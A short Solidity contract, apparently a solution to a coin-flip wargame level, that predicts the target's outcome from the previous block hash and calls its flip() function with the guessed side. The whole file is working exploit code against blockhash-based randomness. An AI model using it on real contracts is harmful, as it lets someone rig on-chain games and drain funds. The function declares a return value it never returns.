pragma solidity ^0.4.24;

import "./coinflip.sol";

contract MyCoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function myflip(address _coinFlipAddress) public returns (bool) {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // Call CoinFlip contract
        CoinFlip contractToCall = CoinFlip(_coinFlipAddress);
        contractToCall.flip(side);
    }
}